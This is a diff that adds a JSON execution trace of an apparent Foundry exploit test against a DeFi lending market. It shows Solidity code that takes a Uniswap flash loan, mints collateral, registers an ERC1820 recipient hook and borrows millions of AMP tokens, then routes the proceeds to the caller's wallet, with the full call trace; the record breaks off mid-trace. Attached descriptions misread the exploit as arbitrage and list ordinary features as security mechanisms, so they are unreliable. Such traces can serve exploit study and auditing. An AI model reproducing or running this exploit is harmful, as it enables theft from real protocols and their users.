@@ -1,0 +1,1055 @@
+{
+  "logs": {
+    "calls": [
+      {
+        "id": "23756",
+        "contract": "ExploitScript",
+        "function": "testExploit",
+        "value": null,
+        "args": "",
+        "return_value": "Returned",
+        "depth": 0,
+        "internal_calls": [
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "deal",
+            "value": null,
+            "args": "ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": []
+          }
+        ]
+      },
+      {
+        "id": "1160395",
+        "contract": "ContractTest",
+        "function": "test",
+        "args": "",
+        "original_code": "    function test() public {\n        payable(address(0)).transfer(address(this).balance);\n        ierc1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));\n\n        mywallet = msg.sender;\n        uni.swap(0, 500 * 1e18, address(this), \"0x00\");\n        emit log_named_uint(\"Exploit completed, WETH Balance\", weth.balanceOf(mywallet));\n    }\n\n",
+        "description": "1. Core functions:\n   The `test` function performs a series of operations: it transfers the entire balance of the contract to the zero address (which effectively burns the funds), sets an interface implementer for the contract, assigns the sender's address to `mywallet`, executes a swap operation on a decentralized exchange (Uniswap), and emits an event logging the WETH balance of `mywallet`.\n\n2. Security mechanism:\n   The function uses `payable(address(0)).transfer(address(this).balance)` to ensure that the contract's balance is sent to the zero address, which is a non-recoverable action, effectively burning the funds. The `setInterfaceImplementer` function is used to register the contract as an implementer of a specific interface, which is a standard practice in Ethereum for interoperability. The `swap` function is called with specific parameters to execute a trade on Uniswap. The function does not include explicit access control modifiers, which could be a security concern if the function is intended to be restricted.\n\n3. Parameter Function:\n   - `address(this).balance`: This parameter represents the current balance of the contract, which is transferred to the zero address.\n   - `TOKENS_RECIPIENT_INTERFACE_HASH`: This is a constant representing the interface hash for the tokens recipient, used in the `setInterfaceImplementer` function.\n   - `0`: This is the amount of input tokens for the swap operation, indicating no input tokens are being sent.\n   - `500 * 1e18`: This is the amount of output tokens expected from the swap operation, equivalent to 500 tokens with 18 decimal places.\n   - `address(this)`: This is the address of the contract itself, used as the recipient in the swap operation.\n   - `\"0x00\"`: This is a placeholder for additional data in the swap operation, typically used for callbacks or other purposes.\n\n4. Return description:\n   The function does not return any value directly. Instead, it performs actions that result in the transfer of funds, setting of an interface implementer, and execution of a swap operation. The final action is emitting an event that logs the WETH balance of `mywallet`, which is the address of the sender who called the function.\n\nIn summary, the `test` function is designed to perform a series of actions including burning the contract's balance, setting an interface implementer, executing a swap on Uniswap, and logging the WETH balance of the sender. However, it lacks explicit security measures like access control, which could be a concern depending on the intended use case.",
+        "return_value": "Returned",
+        "depth": 0,
+        "internal_calls": [
+          {
+            "id": "0",
+            "contract": "0x0000000000000000000000000000000000000000",
+            "function": "fallback",
+            "value": "value: 79228162514264337593543950335",
+            "args": "",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "27371",
+            "contract": "0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24",
+            "function": "setInterfaceImplementer",
+            "value": null,
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "1086359",
+            "contract": "0xd3d2E2692501A5c9Ca623199D38826e513033a17",
+            "function": "swap",
+            "value": null,
+            "args": "0, 500000000000000000000 [5e20], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x30783030",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "29962",
+                "contract": "wETH",
+                "function": "transfer",
+                "value": null,
+                "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]",
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "1014178",
+                "contract": "ContractTest",
+                "function": "uniswapV2Call",
+                "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 500000000000000000000 [5e20], 0x30783030",
+                "original_code": "    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        weth.withdraw(500 * 1e18);\n        creth.mint{value: 500 * 1e18}();\n        creth.borrow(1 * 1e18);\n        cramp.accrueInterest();\n        cramp.borrow(19_480_000_000_000_000_000_000_000);\n        weth.deposit{value: address(this).balance, gas: 40_000}();\n        amp.approve(UniswapV2Router02_address, 19_480_000_000_000_000_000_000_000_000);\n        unirouterv2.swapExactTokensForTokens(\n            19_480_000_000_000_000_000_000_000, 1, path, address(this), block.timestamp\n        );\n        weth.transfer(uin_WTH9_Pair_Address, 502 * 1e18);\n        weth.transfer(mywallet, weth.balanceOf(address(this)));\n    }\n\n",
+                "description": "1. **Core functions**:  \n   This function is designed to interact with decentralized finance (DeFi) protocols, specifically Uniswap and other related contracts. It performs a series of operations, including withdrawing and depositing funds, borrowing assets, and swapping tokens. The goal is to execute a sequence of transactions that likely involve leveraging or arbitrage opportunities within the DeFi ecosystem.\n\n2. **Security mechanism**:  \n   - The function is marked as `external`, meaning it can only be called from outside the contract, adding a layer of restriction.  \n   - It uses specific gas limits (e.g., `gas: 40_000`) to control the amount of computational resources allocated to certain operations, preventing potential gas exhaustion attacks.  \n   - The function does not include explicit access control modifiers (e.g., `onlyOwner`), which could be a security risk if not managed elsewhere in the contract.  \n\n3. **Parameter Function**:  \n   - `sender`: Represents the address initiating the call, though it is not directly used in the function.  \n   - `amount0` and `amount1`: Likely represent amounts of tokens involved in the transaction, but their values are not utilized in the function.  \n   - `data`: Additional data passed to the function, which is not used in this implementation.  \n\n4. **Return description**:  \n   The function does not return any value. Instead, it performs a series of actions:  \n   - Withdraws a fixed amount of WETH (Wrapped Ether).  \n   - Mints and borrows assets using the `creth` and `cramp` contracts.  \n   - Deposits the remaining balance back into WETH.  \n   - Approves and swaps tokens using Uniswap.  \n   - Transfers WETH to specified addresses, including the caller's wallet.  \n\n**In summary**, this function executes a complex sequence of DeFi operations, including withdrawals, borrowing, and token swaps, but lacks explicit security measures like access control. It does not return any value but modifies the state of the contract and interacts with external protocols.",
+                "return_value": "Returned",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "9195",
+                    "contract": "wETH",
+                    "function": "withdraw",
+                    "value": null,
+                    "args": "500000000000000000000 [5e20]",
+                    "return_value": "Returned",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "55",
+                        "contract": "ContractTest",
+                        "function": "receive",
+                        "value": "value: 500000000000000000000",
+                        "args": "",
+                        "return_value": "Returned",
+                        "depth": 4,
+                        "internal_calls": []
+                      }
+                    ]
+                  },
+                  {
+                    "id": "102468",
+                    "contract": "0xD06527D5e56A3495252A528C4987003b712860eE",
+                    "function": "mint",
+                    "value": "value: 500000000000000000000",
+                    "args": "",
+                    "return_value": "Returned",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "9892",
+                        "contract": "0x812C0b2a2A0A74f6f6ed620Fbd2B67Fec7DB2190",
+                        "function": "getBorrowRate",
+                        "value": null,
+                        "args": "1824106833908118122752 [1.824e21], 4625435318087959774131 [4.625e21], 3462470277093771192 [3.462e18]",
+                        "return_value": "0x0000000000000000000000000000000000000000000000000000000beb7f4033",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "12222",
+                        "contract": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+                        "function": "mintAllowed",
+                        "value": null,
+                        "args": "0xD06527D5e56A3495252A528C4987003b712860eE, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]",
+                        "return_value": "0",
+                        "depth": 4,
+                        "internal_calls": [
+                          {
+                            "id": "7042",
+                            "contract": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+                            "function": "mintAllowed",
+                            "value": null,
+                            "args": "0xD06527D5e56A3495252A528C4987003b712860eE, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]",
+                            "return_value": "0",
+                            "depth": 5,
+                            "internal_calls": []
+                          }
+                        ]
+                      },
+                      {
+                        "id": "1016",
+                        "contract": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+                        "function": "mintVerify",
+                        "value": null,
+                        "args": "0xD06527D5e56A3495252A528C4987003b712860eE, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20], 2417223613775 [2.417e12]",
+                        "return_value": "Returned",
+                        "depth": 4,
+                        "internal_calls": [
+                          {
+                            "id": "403",
+                            "contract": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+                            "function": "mintVerify",
+                            "value": null,
+                            "args": "0xD06527D5e56A3495252A528C4987003b712860eE, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20], 2417223613775 [2.417e12]",
+                            "return_value": "Returned",
+                            "depth": 5,
+                            "internal_calls": []
+                          }
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "id": "158822",
+                    "contract": "0xD06527D5e56A3495252A528C4987003b712860eE",
+                    "function": "borrow",
+                    "value": null,
+                    "args": "1000000000000000000 [1e18]",
+                    "return_value": "0",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "99791",
+                        "contract": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+                        "function": "borrowAllowed",
+                        "value": null,
+                        "args": "0xD06527D5e56A3495252A528C4987003b712860eE, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000 [1e18]",
+                        "return_value": "0",
+                        "depth": 4,
+                        "internal_calls": [
+                          {
+                            "id": "99111",
+                            "contract": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+                            "function": "borrowAllowed",
+                            "value": null,
+                            "args": "0xD06527D5e56A3495252A528C4987003b712860eE, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000 [1e18]",
+                            "return_value": "0",
+                            "depth": 5,
+                            "internal_calls": [
+                              {
+                                "id": "2901",
+                                "contract": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+                                "function": "getUnderlyingPrice",
+                                "value": null,
+                                "args": "0xD06527D5e56A3495252A528C4987003b712860eE",
+                                "return_value": "1000000000000000000 [1e18]",
+                                "depth": 6,
+                                "internal_calls": []
+                              },
+                              {
+                                "id": "4752",
+                                "contract": "0xD06527D5e56A3495252A528C4987003b712860eE",
+                                "function": "getAccountSnapshot",
+                                "value": null,
+                                "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                                "return_value": "0, 2417223613775 [2.417e12], 0, 206848881150465064906976491 [2.068e26]",
+                                "depth": 6,
+                                "internal_calls": []
+                              },
+                              {
+                                "id": "901",
+                                "contract": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+                                "function": "getUnderlyingPrice",
+                                "value": null,
+                                "args": "0xD06527D5e56A3495252A528C4987003b712860eE",
+                                "return_value": "1000000000000000000 [1e18]",
+                                "depth": 6,
+                                "internal_calls": []
+                              }
+                            ]
+                          }
+                        ]
+                      },
+                      {
+                        "id": "55",
+                        "contract": "ContractTest",
+                        "function": "receive",
+                        "value": "value: 1000000000000000000",
+                        "args": "",
+                        "return_value": "Returned",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "949",
+                        "contract": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+                        "function": "borrowVerify",
+                        "value": null,
+                        "args": "0xD06527D5e56A3495252A528C4987003b712860eE, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000 [1e18]",
+                        "return_value": "Returned",
+                        "depth": 4,
+                        "internal_calls": [
+                          {
+                            "id": "342",
+                            "contract": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+                            "function": "borrowVerify",
+                            "value": null,
+                            "args": "0xD06527D5e56A3495252A528C4987003b712860eE, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000 [1e18]",
+                            "return_value": "Returned",
+                            "depth": 5,
+                            "internal_calls": []
+                          }
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "id": "54973",
+                    "contract": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+                    "function": "accrueInterest",
+                    "value": null,
+                    "args": "",
+                    "return_value": "0",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "49758",
+                        "contract": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+                        "function": "accrueInterest",
+                        "value": null,
+                        "args": "",
+                        "return_value": "0",
+                        "depth": 4,
+                        "internal_calls": [
+                          {
+                            "id": "14965",
+                            "contract": "0xbadaC56c9aca307079e8B8FC699987AAc89813ee",
+                            "function": "getBorrowRate",
+                            "value": null,
+                            "args": "33663858581302237334110531 [3.366e25], 470166088159676190211552469 [4.701e26], 207252914123973988114735 [2.072e23]",
+                            "return_value": "0x0000000000000000000000000000000000000000000000000000005976e58ebf",
+                            "depth": 5,
+                            "internal_calls": []
+                          }
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "id": "464839",
+                    "contract": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+                    "function": "borrow",
+                    "value": null,
+                    "args": "19480000000000000000000000 [1.948e25]",
+                    "return_value": "0",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "464035",
+                        "contract": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+                        "function": "borrow",
+                        "value": null,
+                        "args": "19480000000000000000000000 [1.948e25]",
+                        "return_value": "0",
+                        "depth": 4,
+                        "internal_calls": [
+                          {
+                            "id": "235994",
+                            "contract": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+                            "function": "borrowAllowed",
+                            "value": null,
+                            "args": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19480000000000000000000000 [1.948e25]",
+                            "return_value": "0",
+                            "depth": 5,
+                            "internal_calls": [
+                              {
+                                "id": "235314",
+                                "contract": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+                                "function": "borrowAllowed",
+                                "value": null,
+                                "args": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19480000000000000000000000 [1.948e25]",
+                                "return_value": "0",
+                                "depth": 6,
+                                "internal_calls": [
+                                  {
+                                    "id": "35242",
+                                    "contract": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+                                    "function": "registerCollateral",
+                                    "value": null,
+                                    "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                                    "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000",
+                                    "depth": 7,
+                                    "internal_calls": [
+                                      {
+                                        "id": "34425",
+                                        "contract": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+                                        "function": "registerCollateral",
+                                        "value": null,
+                                        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                                        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000",
+                                        "depth": 8,
+                                        "internal_calls": [
+                                          {
+                                            "id": "1380",
+                                            "contract": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+                                            "function": "checkMembership",
+                                            "value": null,
+                                            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+                                            "return_value": "false",
+                                            "depth": 9,
+                                            "internal_calls": [
+                                              {
+                                                "id": "706",
+                                                "contract": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+                                                "function": "checkMembership",
+                                                "value": null,
+                                                "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+                                                "return_value": "false",
+                                                "depth": 10,
+                                                "internal_calls": []
+                                              }
+                                            ]
+                                          }
+                                        ]
+                                      }
+                                    ]
+                                  },
+                                  {
+                                    "id": "87817",
+                                    "contract": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+                                    "function": "getUnderlyingPrice",
+                                    "value": null,
+                                    "args": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+                                    "return_value": "17832542795200 [1.783e13]",
+                                    "depth": 7,
+                                    "internal_calls": [
+                                      {
+                                        "id": "2448",
+                                        "contract": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+                                        "function": "underlying",
+                                        "value": null,
+                                        "args": "",
+                                        "return_value": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+                                        "depth": 8,
+                                        "internal_calls": []
+                                      },
+                                      {
+                                        "id": "18698",
+                                        "contract": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+                                        "function": "latestRoundData",
+                                        "value": null,
+                                        "args": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2, 0x0000000000000000000000000000000000000348",
+                                        "return_value": "0x0000000000000000000000000000000000000000000000010000000000001d900000000000000000000000000000000000000000000000000000000000562e8000000000000000000000000000000000000000000000000000000000612c6fe300000000000000000000000000000000000000000000000000000000612c6fe30000000000000000000000000000000000000000000000010000000000001d90",
+                                        "depth": 8,
+                                        "internal_calls": [
+                                          {
+                                            "id": "7410",
+                                            "contract": "0xfAaA7460eD59C12E204349766CE73Cf5202e6aD6",
+                                            "function": "latestRoundData",
+                                            "value": null,
+                                            "args": "",
+                                            "return_value": "7568, 5648000 [5.648e6], 1630302179 [1.63e9], 1630302179 [1.63e9], 7568",
+                                            "depth": 9,
+                                            "internal_calls": []
+                                          }
+                                        ]
+                                      },
+                                      {
+                                        "id": "2106",
+                                        "contract": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+                                        "function": "decimals",
+                                        "value": null,
+                                        "args": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2, 0x0000000000000000000000000000000000000348",
+                                        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000008",
+                                        "depth": 8,
+                                        "internal_calls": [
+                                          {
+                                            "id": "298",
+                                            "contract": "0xfAaA7460eD59C12E204349766CE73Cf5202e6aD6",
+                                            "function": "decimals",
+                                            "value": null,
+                                            "args": "",
+                                            "return_value": "8",
+                                            "depth": 9,
+                                            "internal_calls": []
+                                          }
+                                        ]
+                                      },
+                                      {
+                                        "id": "16698",
+                                        "contract": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+                                        "function": "latestRoundData",
+                                        "value": null,
+                                        "args": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE",
+                                        "return_value": "0x0000000000000000000000000000000000000000000000010000000000000dcf00000000000000000000000000000000000000000000000000011f28151bb18000000000000000000000000000000000000000000000000000000000612c547e00000000000000000000000000000000000000000000000000000000612c547e0000000000000000000000000000000000000000000000010000000000000dcf",
+                                        "depth": 8,
+                                        "internal_calls": [
+                                          {
+                                            "id": "7410",
+                                            "contract": "0xe5BbBdb2Bb953371841318E1Edfbf727447CeF2E",
+                                            "function": "latestRoundData",
+                                            "value": null,
+                                            "args": "",
+                                            "return_value": "3535, 315731990000000 [3.157e14], 1630295166 [1.63e9], 1630295166 [1.63e9], 3535",
+                                            "depth": 9,
+                                            "internal_calls": []
+                                          }
+                                        ]
+                                      },
+                                      {
+                                        "id": "2106",
+                                        "contract": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+                                        "function": "decimals",
+                                        "value": null,
+                                        "args": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE",
+                                        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000012",
+                                        "depth": 8,
+                                        "internal_calls": [
+                                          {
+                                            "id": "298",
+                                            "contract": "0xe5BbBdb2Bb953371841318E1Edfbf727447CeF2E",
+                                            "function": "decimals",
+                                            "value": null,
+                                            "args": "",
+                                            "return_value": "18",
+                                            "depth": 9,
+                                            "internal_calls": []
+                                          }
+                                        ]
+                                      },
+                                      {
+                                        "id": "9664",
+                                        "contract": "USDC",
+                                        "function": "decimals",
+                                        "value": null,
+                                        "args": "",
+                                        "return_value": "6",
+                                        "depth": 8,
+                                        "internal_calls": [
+                                          {
+                                            "id": "2381",
+                                            "contract": "0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF",
+                                            "function": "decimals",
+                                            "value": null,
+                                            "args": "",
+                                            "return_value": "6",
+                                            "depth": 9,
+                                            "internal_calls": []
+                                          }
+                                        ]
+                                      },
+                                      {
+                                        "id": "341",
+                                        "contract": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+                                        "function": "decimals",
+                                        "value": null,
+                                        "args": "",
+                                        "return_value": "18",
+                                        "depth": 8,
+                                        "internal_calls": []
+                                      }
+                                    ]
+                                  },
+                                  {
+                                    "id": "3427",
+                                    "contract": "0xD06527D5e56A3495252A528C4987003b712860eE",
+                                    "function": "getAccountSnapshot",
+                                    "value": null,
+                                    "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                                    "return_value": "0, 2417223613775 [2.417e12], 1000000000000000000 [1e18], 206848881150465064906976491 [2.068e26]",
+                                    "depth": 7,
+                                    "internal_calls": []
+                                  },
+                                  {
+                                    "id": "901",
+                                    "contract": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+                                    "function": "getUnderlyingPrice",
+                                    "value": null,
+                                    "args": "0xD06527D5e56A3495252A528C4987003b712860eE",
+                                    "return_value": "1000000000000000000 [1e18]",
+                                    "depth": 7,
+                                    "internal_calls": []
+                                  },
+                                  {
+                                    "id": "10051",
+                                    "contract": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+                                    "function": "getAccountSnapshot",
+                                    "value": null,
+                                    "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                                    "return_value": "0, 0, 0, 200197219122908640304245949 [2.001e26]",
+                                    "depth": 7,
+                                    "internal_calls": [
+                                      {
+                                        "id": "8548",
+                                        "contract": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+                                        "function": "delegateToImplementation",
+                                        "value": null,
+                                        "args": "0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496",
+                                        "return_value": "0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a59968feb3c75c20d52cbd",
+                                        "depth": 8,
+                                        "internal_calls": [
+                                          {
+                                            "id": "6663",
+                                            "contract": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+                                            "function": "getAccountSnapshot",
+                                            "value": null,
+                                            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                                            "return_value": "0, 0, 0, 200197219122908640304245949 [2.001e26]",
+                                            "depth": 9,
+                                            "internal_calls": []
+                                          }
+                                        ]
+                                      }
+                                    ]
+                                  },
+                                  {
+                                    "id": "26817",
+                                    "contract": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+                                    "function": "getUnderlyingPrice",
+                                    "value": null,
+                                    "args": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+                                    "return_value": "17832542795200 [1.783e13]",
+                                    "depth": 7,
+                                    "internal_calls": [
+                                      {
+                                        "id": "448",
+                                        "contract": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+                                        "function": "underlying",
+                                        "value": null,
+                                        "args": "",
+                                        "return_value": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+                                        "depth": 8,
+                                        "internal_calls": []
+                                      },
+                                      {
+                                        "id": "4198",
+                                        "contract": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+                                        "function": "latestRoundData",
+                                        "value": null,
+                                        "args": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2, 0x0000000000000000000000000000000000000348",
+                                        "return_value": "0x0000000000000000000000000000000000000000000000010000000000001d900000000000000000000000000000000000000000000000000000000000562e8000000000000000000000000000000000000000000000000000000000612c6fe300000000000000000000000000000000000000000000000000000000612c6fe30000000000000000000000000000000000000000000000010000000000001d90",
+                                        "depth": 8,
+                                        "internal_calls": [
+                                          {
+                                            "id": "1410",
+                                            "contract": "0xfAaA7460eD59C12E204349766CE73Cf5202e6aD6",
+                                            "function": "latestRoundData",
+                                            "value": null,
+                                            "args": "",
+                                            "return_value": "7568, 5648000 [5.648e6], 1630302179 [1.63e9], 1630302179 [1.63e9], 7568",
+                                            "depth": 9,
+                                            "internal_calls": []
+                                          }
+                                        ]
+                                      },
+                                      {
+                                        "id": "2106",
+                                        "contract": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+                                        "function": "decimals",
+                                        "value": null,
+                                        "args": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2, 0x0000000000000000000000000000000000000348",
+                                        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000008",
+                                        "depth": 8,
+                                        "internal_calls": [
+                                          {
+                                            "id": "298",
+                                            "contract": "0xfAaA7460eD59C12E204349766CE73Cf5202e6aD6",
+                                            "function": "decimals",
+                                            "value": null,
+                                            "args": "",
+                                            "return_value": "8",
+                                            "depth": 9,
+                                            "internal_calls": []
+                                          }
+                                        ]
+                                      },
+                                      {
+                                        "id": "4198",
+                                        "contract": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+                                        "function": "latestRoundData",
+                                        "value": null,
+                                        "args": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE",
+                                        "return_value": "0x0000000000000000000000000000000000000000000000010000000000000dcf00000000000000000000000000000000000000000000000000011f28151bb18000000000000000000000000000000000000000000000000000000000612c547e00000000000000000000000000000000000000000000000000000000612c547e0000000000000000000000000000000000000000000000010000000000000dcf",
+                                        "depth": 8,
+                                        "internal_calls": [
+                                          {
+                                            "id": "1410",
+                                            "contract": "0xe5BbBdb2Bb953371841318E1Edfbf727447CeF2E",
+                                            "function": "latestRoundData",
+                                            "value": null,
+                                            "args": "",
+                                            "return_value": "3535, 315731990000000 [3.157e14], 1630295166 [1.63e9], 1630295166 [1.63e9], 3535",
+                                            "depth": 9,
+                                            "internal_calls": []
+                                          }
+                                        ]
+                                      },
+                                      {
+                                        "id": "2106",
+                                        "contract": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+                                        "function": "decimals",
+                                        "value": null,
+                                        "args": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE",
+                                        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000012",
+                                        "depth": 8,
+                                        "internal_calls": [
+                                          {
+                                            "id": "298",
+                                            "contract": "0xe5BbBdb2Bb953371841318E1Edfbf727447CeF2E",
+                                            "function": "decimals",
+                                            "value": null,
+                                            "args": "",
+                                            "return_value": "18",
+                                            "depth": 9,
+                                            "internal_calls": []
+                                          }
+                                        ]
+                                      },
+                                      {
+                                        "id": "1164",
+                                        "contract": "USDC",
+                                        "function": "decimals",
+                                        "value": null,
+                                        "args": "",
+                                        "return_value": "6",
+                                        "depth": 8,
+                                        "internal_calls": [
+                                          {
+                                            "id": "381",
+                                            "contract": "0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF",
+                                            "function": "decimals",
+                                            "value": null,
+                                            "args": "",
+                                            "return_value": "6",
+                                            "depth": 9,
+                                            "internal_calls": []
+                                          }
+                                        ]
+                                      },
+                                      {
+                                        "id": "341",
+                                        "contract": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+                                        "function": "decimals",
+                                        "value": null,
+                                        "args": "",
+                                        "return_value": "18",
+                                        "depth": 8,
+                                        "internal_calls": []
+                                      }
+                                    ]
+                                  }
+                                ]
+                              }
+                            ]
+                          },
+                          {
+                            "id": "169890",
+                            "contract": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+                            "function": "transfer",
+                            "value": null,
+                            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19480000000000000000000000 [1.948e25]",
+                            "return_value": "true",
+                            "depth": 5,
+                            "internal_calls": [
+                              {
+                                "id": "2942",
+                                "contract": "0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24",
+                                "function": "getInterfaceImplementer",
+                                "value": null,
+                                "args": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6, 0x60881b58a7ad1ebd3bc0e92b8277996363a67ded0f43bd95d11c320bab72b5a4",
+                                "return_value": "0x0000000000000000000000000000000000000000",
+                                "depth": 6,
+                                "internal_calls": []
+                              },
+                              {
+                                "id": "942",
+                                "contract": "0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24",
+                                "function": "getInterfaceImplementer",
+                                "value": null,
